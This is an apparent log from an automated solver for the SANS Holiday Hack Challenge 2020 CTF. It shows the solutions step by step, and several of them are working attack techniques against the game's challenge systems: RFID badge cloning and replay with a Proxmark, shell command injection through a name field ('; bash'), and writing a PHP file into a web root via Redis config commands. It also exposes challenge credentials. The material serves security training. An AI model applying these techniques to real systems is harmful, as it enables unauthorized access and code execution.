2020-12-27 11:32:13.625 +00:00 [VRB] Started SANS Holiday Hack, December 2020
2020-12-27 11:32:13.643 +00:00 [VRB] Using CTF runner 0.1.0-alpha.19
2020-12-27 11:32:13.644 +00:00 [VRB] Playing OpenHIDLock, SortOMatic, LinuxPremier, PointOfSalePasswordRecovery, TheElfCode, InvestigateS3Bucket, KringleKiosk, UnescapeTmux, Splunk, DialUp336Kbps, RedisBugHunt, SnowballFight, SpeakerDoorOpen, SpeakerLightsOn, SpeakerVendingMachineOn, CANBusInvestigation, ScapyPrepper, DefeatFingerprintSensor, UncoverChristmasList
2020-12-27 11:32:13.646 +00:00 [VRB] Running challange OpenHIDLock
2020-12-27 11:32:13.647 +00:00 [INF] Open proxmark and call lf hid read next to Bow Ninecandle in Talks Lobby
#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023
2020-12-27 11:32:13.647 +00:00 [INF] Open proxmark and call lf hid read next to Noel Boetie in Wrapping Room
#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020
2020-12-27 11:32:13.648 +00:00 [INF] Open proxmark and call lf hid read next to Sparkle Redberry in Entryway
#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022
2020-12-27 11:32:13.648 +00:00 [INF] Open proxmark and call lf hid read next to Angel Candysalt in Great Room
#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040
2020-12-27 11:32:13.648 +00:00 [INF] Open proxmark and call lf hid read next to Shinny Upatree in Front Lawn
#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
2020-12-27 11:32:13.648 +00:00 [INF] Open proxmark and call lf hid read next to  in 

2020-12-27 11:32:13.649 +00:00 [INF] Open proxmark and call lf hid read next to  in 

2020-12-27 11:32:13.649 +00:00 [INF] Open proxmark CLI and type pm3 --> lf hid sim -r 2006e22f0e next to the door in Workshop

                [=] Simulating HID tag using raw 2006e22f0e
                [=] Stopping simulation after 10 seconds.

            
2020-12-27 11:32:13.649 +00:00 [VRB] Challenge OpenHIDLock completed
2020-12-27 11:32:13.650 +00:00 [VRB] Running challange SortOMatic
2020-12-27 11:32:13.650 +00:00 [INF] SORT-O-MATIC HELP MANUAL
                
                About
                The SORT-O-MATIC is responsible for separating properly wrapped presents from disfunctional misfit presents. Properly wrapped presents are put into Santa's gift bag while the misfit toys are dropped into a box with a portal to the Island of Misfit Toys.

                The SORT-O-MATIC's configuration works using regular expressions. When all eight regular expressions match the desired values the SORT-O-MATIC will properly sort presents.

                Troubleshooting
                If the SORT-O-MATIC is NOT sorting presents at 100% accuracy, you will need to add the desired regex in the invalid (red-highlighted) inputs and then click the corresponding toggle switch. If you provide the correct regular expression and toggle the switch, the input will turn green and the progress bar will grow. You must reach 100% accuracy in order to fix the SORT-O-MATIC.

                Click on the description above each input to display a message with more details about the desired regular expression.

                Click the HELP button on the SORT-O-MATIC to view this help manual again.

            
2020-12-27 11:32:13.663 +00:00 [INF] 1.Matches at least one digit
[0-9]
2020-12-27 11:32:13.663 +00:00 [INF] 2.Matches 3 alpha a-z characters ignoring case
[A-Za-z][A-Za-z][A-Za-z]
2020-12-27 11:32:13.663 +00:00 [INF] 3. Matches 2 chars of lowercase a-z or numbers
[0-9a-z][0-9a-z]
2020-12-27 11:32:13.663 +00:00 [INF] 4. Matches any 2 chars not uppercase A-L or 1 - 5
[A-L1-5]
2020-12-27 11:32:13.663 +00:00 [INF] 5. Matches three or more digits only
^[0-9][0-9][0-9]+$
2020-12-27 11:32:13.664 +00:00 [INF] 6. Matches multiple hour:minute: second time formats only
^(([01]?[0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9])$
2020-12-27 11:32:13.664 +00:00 [INF] 7. Matches MAC address format only while ignoring case. https://ihateregex.io/expr/mac-address/
^[a-fA-F0-9]{2}(:[a-fA-F0-9]{2}){5}$
2020-12-27 11:32:13.664 +00:00 [INF] 8. Matches multiple day, month, and year date formats only. 
Create a regular expression that only matches one of the three following day, month, and four digit year formats:

                10/01/1978
                01.10.1987
                14-12-1991

                However, the following values would be invalid formats:
                05/25/89
                12-32-1989
                01.1.1989
                1/1/1

                Use anchors or boundary markers to avoid matching other surrounding strings.
^((0[1-9]|1[0-9])[-/.](0[1-9]|[12]\d|3[01])[-/.][12]\d{3})$
2020-12-27 11:32:13.664 +00:00 [VRB] Challenge SortOMatic completed
2020-12-27 11:32:13.665 +00:00 [VRB] Running challange LinuxPremier
2020-12-27 11:32:13.666 +00:00 [INF] Linux Premier

                The North Pole üç≠ Lollipop Maker:
                All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and üç≠'s will appear in the green bar below. Run the command "hintme" to receive a hint.
            
2020-12-27 11:32:13.667 +00:00 [INF] Complete challenge by typing following commands

                yes
                ls
                cat munchkin_19315479765589239 
                rm munchkin_19315479765589239
                pwd
                ls -a
                cat .bash_history
                set
                cd workshop/
                grep -i munch *.txt
                chmod +x lollipop_engine
                ./lollipop_engine
                cd electrical/
                mv blown_fuse0 fuse0

            
2020-12-27 11:32:13.668 +00:00 [INF] A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.
chmod +x lollipop_engine
./lollipop_engine
2020-12-27 11:32:13.671 +00:00 [VRB] Challenge LinuxPremier completed
2020-12-27 11:32:13.673 +00:00 [VRB] Running challange PointOfSalePasswordRecovery
2020-12-27 11:32:13.674 +00:00 [INF] Install npm install -g --engine-strict asar
2020-12-27 11:32:13.674 +00:00 [INF] Run asar e app.asar .\app
2020-12-27 11:32:13.675 +00:00 [VRB] Challenge PointOfSalePasswordRecovery completed
2020-12-27 11:32:13.676 +00:00 [VRB] Running challange TheElfCode
2020-12-27 11:32:13.681 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-1.js
elf.moveTo(lollipop[0]);
elf.moveUp(10);


2020-12-27 11:32:13.681 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-2.js
elf.moveLeft(6);
elf.pull_lever(elf.get_lever(0) + 2);
elf.moveLeft(4);
elf.moveUp(10);

2020-12-27 11:32:13.682 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-3.js
for (i = 0; i < 3; i++)
    elf.moveTo(lollipop[i])
elf.moveUp(1)


2020-12-27 11:32:13.728 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-4.js
for (i = 0; i < 3; i++) {
    elf.moveLeft(3);
    elf.moveUp(11);
    elf.moveLeft(3);
    elf.moveDown(11);
}

2020-12-27 11:32:13.735 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-5.js
let request = elf.ask_munch(0)
var response = []
request.forEach((value) => {
    if (typeof (value) == "number") response.push(value);
});
elf.moveTo(munchkin[0]);
elf.tell_munch(response);
elf.moveUp(2);

2020-12-27 11:32:13.736 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-6.js
for (i = 0; i <= 3; i++)
    elf.moveTo(lollipop[i])
elf.moveLeft(2);
elf.moveUp(5);
elf.pull_lever(["munchkins rule"].concat(elf.get_lever(0)));
elf.moveTo(munchkin[0])
elf.moveUp(3)








2020-12-27 11:32:13.738 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-7.js
function Hello(arrays) {
    var sum = 0;
    arrays.forEach((array) => array.forEach((value) => sum += typeof (value) == "number" ? value : 0));
    return sum;
  }
  function MoveAndPull(direction, j) {
    if (direction == 1)
      elf.moveDown(direction + j);
    if (direction == 2)
      elf.moveLeft(direction + j);
    if (direction == 3)
      elf.moveUp(direction + j);
    if (direction == 4)
      elf.moveRight(direction + j);
    elf.pull_lever(direction - 1 + j);
  }
  
  for (i = 0; i < 2; i++)
    for (j = 1; j <= 4; j++)
      MoveAndPull(j, i * 4);
  elf.moveUp(2);
  elf.moveLeft(4);
  elf.tell_munch(Hello);
  elf.moveUp(1);


2020-12-27 11:32:13.741 +00:00 [INF] Challenges\Floor1\DiningRoom\TheElfCode\Level-8.js
function hello(objects) {
    console.log(objects);
    objects.forEach((o) => {
        for (key in o) {
            console.log(`${key}: ${o[key]}`);
            if (o[key] == "lollipop")
                result = key;
        }
    });

    console.log(result);
    return result;
}

let sum = 0
for (i = 0; i < 6; i++) {
    if ((i % 2) == 0)
        elf.moveRight(i * 2 + 1);
    else
        elf.moveLeft(i * 2 + 1);

    elf.pull_lever((sum += elf.get_lever(i)))
    elf.moveUp(3);
}
elf.ask_munch(0);
elf.tell_munch(hello);
elf.moveRight(11);

2020-12-27 11:32:13.743 +00:00 [VRB] Challenge TheElfCode completed
2020-12-27 11:32:13.745 +00:00 [VRB] Running challange InvestigateS3Bucket
2020-12-27 11:32:14.112 +00:00 [ERR] The remote server returned an error: (404) Not Found.
2020-12-27 11:32:14.139 +00:00 [VRB] Running challange KringleKiosk
2020-12-27 11:32:14.141 +00:00 [INF] Go to option 4 and enter ; ls

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;ls    
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                welcome.sh


            
2020-12-27 11:32:14.202 +00:00 [INF] Go to option 4 and enter ;cat welcome.sh


                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;cat welcome.sh
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                #!/bin/bash

                declare -x LAST_ORDER
                LAST_ORDER=''

                # https://bash.cyberciti.biz/guide/Menu_driven_scripts
                # A menu driven shell script sample template
                ## ----------------------------------
                # Step #1: Define variables
                # ----------------------------------
                RED='\033[0;41;30m'
                STD='\033[0;0;39m'

                # ----------------------------------
                # Step #2: User defined function
                # ----------------------------------
                pause() {
                  read -r -p "Press[Enter] key to continue..." fackEnterKey
                }

                        one()
                        {
                            cat / opt / castlemap.txt
                          pause
                        }

                        two()
                        {
                            more / opt / coc.md
                          pause
                        }


                        three()
                        {
                            cat / opt / directory.txt
                          pause
                        }

                        four()
                        {
                            read - r - p "Enter your name (Please avoid special characters, they cause some weird errors)..." name
                          if [-z "$name"]; then
                  name = "Santa\'s Little Helper"
                          fi
                          bash - c "/usr/games/cowsay -f /opt/reindeer.cow $name"
                          pause
                        }

                        surprise()
                        {
                            cat / opt / plant.txt
                          echo "Sleeping for 10 seconds.." && sleep 10
                        }

                # function to display menus
                        show_menus()
                        {
                            clear
                            echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
                          echo " Welcome to the North Pole!"
                          echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
                          echo "1. Map"
                          echo "2. Code of Conduct and Terms of Use"
                          echo "3. Directory"
                          echo "4. Print Name Badge"
                          echo "5. Exit"
                          echo
                  echo
                          echo "Please select an item from the menu by entering a single number."
                          echo "Anything else might have ... unintended consequences."
                          echo
                        }

                # read input from the keyboard and take a action
                        read_options()
                        {
                            local choice
                          read - r - p "Enter choice [1 - 5] " choice
                          case $choice in
                  1 *) one; ;
                            2 *) two; ;
                            3 *) three; ;
                            4 *) four $choice; ;
                            5) exit 0; ;
                            plant) surprise c; ;
                            *) echo - e "${RED}Error...${STD}" && sleep 2; ;
                            esac
                        }

                # ----------------------------------------------
                # Step #3: Trap CTRL+C, CTRL+Z and quit singles
                # ----------------------------------------------
                        trap '' SIGINT SIGQUIT SIGTSTP

                # -----------------------------------
                # Step #4: Show opening message once
                # ------------------------------------
                echo
                echo Welcome to our castle, we\'re so glad to have you with us!
                echo Come and browse the kiosk\; though our app\'s a bit suspicious.
                echo Poke around, try running bash, please try to come discover,
                echo Need our devs who made our app pull/patch to help recover?
                echo
                echo "Escape the menu by launching /bin/bash"
                echo
                echo
                read -n 1 -r -s -p $'Press enter to continue...'
                clear

                # -----------------------------------
                # Step #5: Main logic - infinite loop
                # ------------------------------------

                while true; do
                  show_menus
                  read_options
                done



            
2020-12-27 11:32:14.288 +00:00 [INF] Go to option 4 and enter ;bash

                
                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.
                Enter choice [1 - 5] 4
                Enter your name (Please avoid special characters, they cause some weird errors)...;bash
                 _______________________
                < Santa's Little Helper >
                 -----------------------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
                   ___                                                      _    
                  / __|   _  _     __      __      ___     ___     ___     | |   
                  \__ \  | +| |   / _|    / _|    / -_)   (_-<    (_-<     |_|   
                  |___/   \_,_|   \__|_   \__|_   \___|   /__/_   /__/_   _(_)_  
                _|""""" | _ | """""|_|""""" | _ | """""|_|""""" | _ | """""|_|""""" | _ | """ | 
                "`-0-0-'"`-0 - 0 - '"`-0-0-'"`-0-0-'"`-0 - 0 - '"`-0-0-'"`-0-0-'"`-0 - 0 - ' 
                Type 'exit' to return to the menu.
                shinny@9edb28c788e6: ~$ 

            
2020-12-27 11:32:14.336 +00:00 [INF] Wonder around...

                Type 'exit' to return to the menu.

                shinny@9edb28c788e6:~$ ls
                welcome.sh
                shinny@9edb28c788e6:~$ cd ..
                shinny@9edb28c788e6:/home$ ls
                elf  shinny
                shinny@9edb28c788e6:/home$ whoami
                shinny
                shinny@9edb28c788e6:/home$ cd elf
                shinny@9edb28c788e6:/home/elf$ ls
                runtoanswer
                shinny@9edb28c788e6:/home/elf$ ./runtoanswer 

                Sorry, that answer is incorrect. Please try again!
            
2020-12-27 11:32:14.339 +00:00 [INF] Menu
Menu

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] 
            
2020-12-27 11:32:14.341 +00:00 [INF] Code of Conduct and Terms of Use 


                    # KringleCon III and Holiday Hack Challenge Code of Conduct

                    1. Use the challenges here to have fun, explore, engage, and develop your cyber security skills!

                    2. Be kind! Feel free to encourage and help other players! Let Santa's elves (support@holidayhackc
                    hallenge.com) know if something seems off. Please be mindful that there are children playing. Sant
                    a is watching!

                    3. Please don't post full answers publicly until the official contest ends on Monday, January 4, 2
                    021.

                    4. SANS Holiday Hack strives to create an atmosphere of learning, growth, and community. We value 
                    the participation and input, in this event and in the industry, of people of all genders, sexual i
                    dentities, cultures, socioeconomic backgrounds, races, ethnicities, nationalities, religions, and 
                    ages. Please support this atmosphere with respectful behavior and speech. This applies to all onli
                    ne interactions associated with KringleCon and the Holiday Hack Challenge, including game chat and
                     discussions.


                    # KringleCon III and Holiday Hack Challenge Terms of Use

                    1. This service includes a "group chat" component. We cannot make any guarantees about the accurac
                    y, quality, or age - appropriateness of chat messages.

                    2.All activity and interactions within Holiday Hack Challenge are monitored and recorded.We use
                    this information to maintain an environment that is both safe and conducive to learning.

                    3.Players should avoid engaging in techniques on any Holiday Hack Challenge server that may negat
                    ively affect the server's operational status and/or availability.

                    4.Players must not attack Holiday Hack Challenge servers(*.holidayhackchallenge.com, *.kringleco
                    n.com, etc.) unless otherwise directed.If you have any questions about target scope, please email
                    : support@holidayhackchallenge.com.

                    5.E - mail addresses collected will be used in accordance with the SANS Privacy Policy(https://www
                    .sans.org / privacy /).
                
2020-12-27 11:32:14.395 +00:00 [INF] Directory


                        Name: Floor: Room:
                        Ribb Bonbowford       1        Dining Room
                        Noel Boetie           1        Wrapping Room
                        Ginger Breddie        1        Castle Entry
                        Minty Candycane       1.5      Workshop
                        Angel Candysalt       1        Great Room
                        Tangle Coalbox        1        Speaker UNPreparedness
                        Bushy Evergreen       2        Talks Lobby
                        Holly Evergreen       1        Kitchen
                        Bubble Lightington    1        Courtyard
                        Jewel Loggins Front Lawn
                        Sugarplum Mary        1        Courtyard
                        Pepper Minstix Front Lawn
                        Bow Ninecandle        2        Talks Lobby
                        Morcel Nougat         2        Speaker UNPreparedness
                        Wunorse Openslae      R NetWars Room
                        Sparkle Redberry      1        Castle Entry
                        Jingle Ringford                NJTP
                        Piney Sappington      1        Castle Entry
                        Chimney Scissorsticks 2        Talks Lobby
                        Fitzy Shortstack      1        Kitchen
                        Alabaster Snowball R        NetWars Room
                        Eve Snowshoes         3        Santa's Balcony
                        Shinny Upatree                 Front Lawn
                        Tinsel Upatree        3        Santa's Office
                
2020-12-27 11:32:14.438 +00:00 [INF] Print Name Badge

                Enter your name (Please avoid special characters, they cause some weird errors)...Jandini
                 _________
                < Jandini >
                 ---------
                  \
                   \   \_\_    _/_/
                    \      \__/
                           (oo)\_______
                           (__)\       )\/\
                               ||----w |
                               ||     ||
            
2020-12-27 11:32:14.440 +00:00 [INF] Plant

                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 Welcome to the North Pole!
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                1. Map
                2. Code of Conduct and Terms of Use
                3. Directory
                4. Print Name Badge
                5. Exit


                Please select an item from the menu by entering a single number.
                Anything else might have ... unintended consequences.

                Enter choice [1 - 5] plant
                  Hi, my name is Jason the Plant!

                  ( U
                   \| )
                  __|/
                  \    /
                   \__/ ejm96
                Sleeping for 10 seconds..
            
2020-12-27 11:32:14.470 +00:00 [INF] Map


                 __       _    --------------                                                
                |__)_  _ (_   | NetWars Room |                                               
                | \(_)(_)|    |              |                                               
                              |            * |                                               
                               --------------                                                
                                                                             
                __  __                              __  __                                   
                 _)|_                                _)|_          -------                   
                /__|        Tracks                  __)|          |Balcony|                  
                            1 2 3 4 5 6 7                          -------                   
                 -------    -------------                             |                      
                |Speaker|--| Talks Lobby |                        --------                   
                |Unprep |  |             |                       |Santa's |                  
                 -------    ------       |                       |Office  |                  
                                  |      |                        --    --                   
                                  |     *|                          |  |                     
                                   ------                           |   ---                  
                                                                    |    * |                 
                    __                                               ------                  
                 /||_                                                                        
                  ||                                          __ __           --------       
                  --------------------------              /| |_ |_           |Wrapping|      
                 |        Courtyard         |              |.__)|            |  Room  |      
                  --------------------------                                  --------       
                    |                    |                                       |           
                 ------    --------    ------                          ---    --------       
                |Dining|--|Kitchen |--|Great |                            |--|Workshop|      
                |      |   --------   |      |                            |  |        |      
                | Room |--|      * |--| Room |                            |  |        |      
                |      |  |Entryway|  |      |                            |  |        |      
                 ------    --------    ------                             |  |        |      
                               |                                             | *      |      
                           ----------                                         --------       
                          |Front Lawn|       NOTE: * denotes Santavator                      
                           ----------                                                        
            
2020-12-27 11:32:14.493 +00:00 [VRB] Challenge KringleKiosk completed
2020-12-27 11:32:14.518 +00:00 [VRB] Running challange UnescapeTmux
2020-12-27 11:32:14.519 +00:00 [INF] Run tmux attach 

                ..............................'.''''''.'''''''''''''
                .........................................'''''''''''
                ................................,:lccc:;,'...'''''''
                .............................';loodxkkxxdlc;'..'''''
                ............................,:ccllcldx0dxxdoc..'''''
                ...........................;ccclooodkOkok0OOx:..''''
                .........................':cccllodxxkkkOkxdxx;....''
                ........................,cccllooddxkOOOkOxoo'.....''
                ......................';:cclllccllodO0Okkkx;...'''..
                .....................:llollclclccccclokc::'.........
                ...................;ddollllllllcccccccl;............
                ..................:xdooddoooolclllllolld;...........
                .................'xxoodxxxdoooooooxkdooox'..........
                .................,xxkxdxkkxxdddddddxkkxdxl....'.....
                .................'xOkooddxkkxxdddxxkkxxxxx'.......'.
                ..................oOkddxkkkkdxxdddxxxxxxdd:......'.'
                .................';k0xxkxxOxdddddoodxdxkkx:....'''''
                ................'',o0xdddxkxdxdodddddkkkxxc....'''''
                ................',,:OK0kkOOxddddxxxddxxkxd:'''''''''
                .............',;:cccdKXKOkkOOxkxdxxxxxxkOx;'''''''''
                ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,''''''''
                .......''':c:,..'coodOO00OOOO00kxOkK0KkO0d,,''''''''
                ...;cllc::clddooddOkxoccccccloddxxO0KK0KKOc:;,''''''
                'ldolcc:::lldxkOxkO000OOOOkkxxdddxoooooooooodxxxddol
                xxlcc:::::xolldddxOOdddxxxkkOOO0000000xkOkkxddoooooo
                lo:::cccc::ldoodooxd,;lxxkkO0OOOOOOOOOOOOOO000000000
                locclccccccccldkxdkk:,;cdxkOKXXXKKKKKXXKk::::cllodxk
                xxollllcccllcodkOkO0:,,,:dkOOKKXXXKKKXXKl,,'''''''''
                xxkolllllllllodkO0KO;,,,;;lxO00KKXKKKKK0c;,,,,,,,,,,
                ,dxxxdoooollodxk0KOolc:::::cdO00KK00K000c;,,,,,,,,,;
                ..:xkOOkdoxxkOO0OxoooooolooodxOO00Ok0kk0oc:;;;;;;;;;
                ....:dkOddOO0OkdoolllllloooddxOOOOOkkkkOdllccccccccc

                You found her! Thank you!!!
            
2020-12-27 11:32:14.532 +00:00 [VRB] Challenge UnescapeTmux completed
2020-12-27 11:32:14.534 +00:00 [VRB] Running challange Splunk
2020-12-27 11:32:14.535 +00:00 [INF] Splunk url taken from java script page...
https://splunk.kringlecastle.com/en-US/account/insecurelogin?username=santa&password=2f3a4fccca6406e35bcf33e92dd93135
2020-12-27 11:32:14.564 +00:00 [VRB] Opening https://splunk.kringlecastle.com/en-US/account/insecurelogin?username=santa&password=2f3a4fccca6406e35bcf33e92dd93135 in default web browser
2020-12-27 11:32:14.751 +00:00 [INF] get indexes query
| tstats count where index=* by index
2020-12-27 11:32:14.752 +00:00 [VRB] Challenge Splunk completed
2020-12-27 11:32:14.780 +00:00 [VRB] Running challange DialUp336Kbps
2020-12-27 11:32:14.781 +00:00 [INF] Fitzy Shortstack

                We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken!

                Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence.

                Maybe you can help me out? The phone number is 756-8347; you can use this blue phone.

                ...

                "Put it in the cloud," they said...

            
2020-12-27 11:32:14.784 +00:00 [INF] Run from console to call
["pickup","dtmf7","dtmf5","dtmf6","dtmf8","dtmf3","dtmf4","dtmf7", "respCrEsCl","ack","cm_cj","l1_l2_info","trn"].forEach((step)=> document.getElementsByClassName(step)[0].click());
2020-12-27 11:32:14.788 +00:00 [VRB] Challenge DialUp336Kbps completed
2020-12-27 11:32:14.809 +00:00 [VRB] Running challange RedisBugHunt
2020-12-27 11:32:14.834 +00:00 [INF] Run following commands: 
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/some.php --output -



                We need your help!!

                The server stopped working, all that's left is the maintenance port.

                To access it, run:

                curl http://localhost/maintenance.php

                We're pretty sure the bug is in the index page. Can you somehow use the
                maintenance page to view the source code for the index page?
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php
                Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=set,test,"%3C%3Fphp+readfile('index.php')+%3F%3E"
                Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php readfile('\''index.php'\'') ?>'

                OK
                player@58394353a03f:~$ curl http://localhost/maintenance.php?cmd=save
                Running: redis-cli --raw -a '<password censored>' 'save'

                OK
                player@58394353a03f:~$ curl http://localhost/some.php
                Warning: Binary output can mess up your terminal. Use "--output -" to tell 
                Warning: curl to output it to your terminal anyway, or consider "--output 
                Warning: <FILE>" to save to a file.
                player@58394353a03f:~$ curl http://localhost/some.php --output -
                REDIS0009ÔøΩ      redis-ver5.0.3ÔøΩ
                ÔøΩedis-bitsÔøΩ@ÔøΩctimeÔøΩ¬™ÔøΩ_used-mem
                 aof-preambleÔøΩÔøΩÔøΩ test<?php

                # We found the bug!!
                #
                #         \   /
                #         .\-/.
                #     /\ ()   ()
                #       \/~---~\.-~^-.
                # .-~^-./   |   \---.
                #      {    |    }   \
                #    .-~\   |   /~-.
                #   /    \  A  /    \
                #         \/ \/
                # 

                echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
                ?>
                example1The site is in maintenance modexample2#We think there's a bug in index.phpÔøΩÔøΩÔøΩ'i hplayer@58394353a03f:~$ 

            
2020-12-27 11:32:15.021 +00:00 [VRB] Challenge RedisBugHunt completed
2020-12-27 11:32:15.023 +00:00 [VRB] Running challange SnowballFight
2020-12-27 11:32:15.025 +00:00 [VRB] Challenge SnowballFight completed
2020-12-27 11:32:15.028 +00:00 [VRB] Running challange SpeakerDoorOpen
2020-12-27 11:32:15.030 +00:00 [INF] cat door

                    ÔøΩÔøΩz9ÔøΩÔøΩz9ÔøΩÔøΩÔøΩ7ÔøΩÔøΩz9ÔøΩÔøΩz9ÔøΩÔøΩz9ÔøΩÔøΩz9ÔøΩÔøΩÔøΩ7ÔøΩÔøΩÔøΩUÔøΩÔøΩVÔøΩÔøΩ0VÔøΩÔøΩÔøΩUÔøΩÔøΩVÔøΩÔøΩMZÔøΩÔøΩÔøΩZÔøΩÔøΩ|ZÔøΩÔøΩÔøΩZÔøΩÔøΩÔøΩZÔøΩÔøΩR[ÔøΩÔøΩÔøΩ[ÔøΩÔøΩ~[ÔøΩÔøΩÔøΩ[ÔøΩÔøΩÔøΩ[ÔøΩÔøΩ/home/
                    elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
                    password is probably stored right in the binary. There's gotta be a
                    tool for this...
                    What do you enter? > opendoor   (bytes Overflowextern " NulErrorBox<Any>thread 'expected, found Do
                    or opened!
                    That would have opened the door!
                    Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
                    Beep boop invalid password
                    src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/usr/sr
                    c/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace:
                                      -       ÔøΩcannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/
                    backtrace/src/lib.rsSomething went wrong: Checking...Something went wrong reading input: Something
                     went wrong in the environment: couldn't get the executable name
                    Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
                    or su or some other process that alters the environment. If this persists, please
                    the NoneSome <= Zerokind    __ZNshim as u128i128charboolmut for< -> dyn  mainfull/ at  environment
                    al variable is missing - that can happen if you're using sudo

            
2020-12-27 11:32:15.067 +00:00 [INF] strings door

                /lib64/ld-linux-x86-64.so.2
                @1(I
                libdl.so.2
                _ITM_deregisterTMCloneTable
                __gmon_start__
                _ITM_registerTMCloneTable
                dladdr
                libpthread.so.0
                nanosleep
                pthread_mutex_init
                pthread_cond_destroy
                pthread_mutexattr_settype
                pthread_rwlock_unlock
                pthread_getspecific
                pthread_condattr_init
                sigaction
                pthread_condattr_setclock
                8STs
                LwH'
                             at 0123456789abcdef
                ) when slicing `
                connection resetentity not foundalready borrowed$
                /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
                password is probably stored right in the binary. There's gotta be a
                tool for this...
                What do you enter? > 
                opendoor
                 (bytes Overflowextern "
                NulErrorBox<Any>thread 'expected, found Door opened!
                That would have opened the door!
                Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
                Beep boop invalid password
                src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/usr/src/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace:
                 -       
                cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/backtrace/src/lib.rsSomething went wrong: Checking...Something went wrong reading input: Something went wrong in the environment: couldn't get the executable name
                Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
                or su or some other process that alters the environment. If this persists, please
                the NoneSome <= Zerokind    __ZNshim as u128i128charboolmut for< -> dyn 
                mainfull/
                 at  environmental variable is missing - that can happen if you're using sudo
                There is something wrong with your environment; the most likely reason is that
                Something went wrong, please try again and report if this persists: a Display implementation returned an error unexpectedly00000000-0000-4000-0000-000000000000WARNING: The RESOURCE_ID is 00000000-0000-4000-0000-000000000000 - be sure to use a real one in production!
                resource_id is not a valid uuidv4! It's vresource_id is not a valid uuid (Couldn't get resource_id from the environmental variable ", "action": "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899
                [...]src/libcore/str/mod.rsbyte index  is not a char boundary; it is inside ) of `begin <= end ( is out of bounds of `Utf8Errorvalid_up_toerror_lenParseIntErrorEmptyInvalidDigitUnderflowsrc/libcore/slice/mod.rs
                ./?\]_
                )147:;=IJ]
                )14:;EFIJ^de
                )EIWde
                EIde
                INOWY^_
                no^"{
                PI73
                G       '       u
                8889
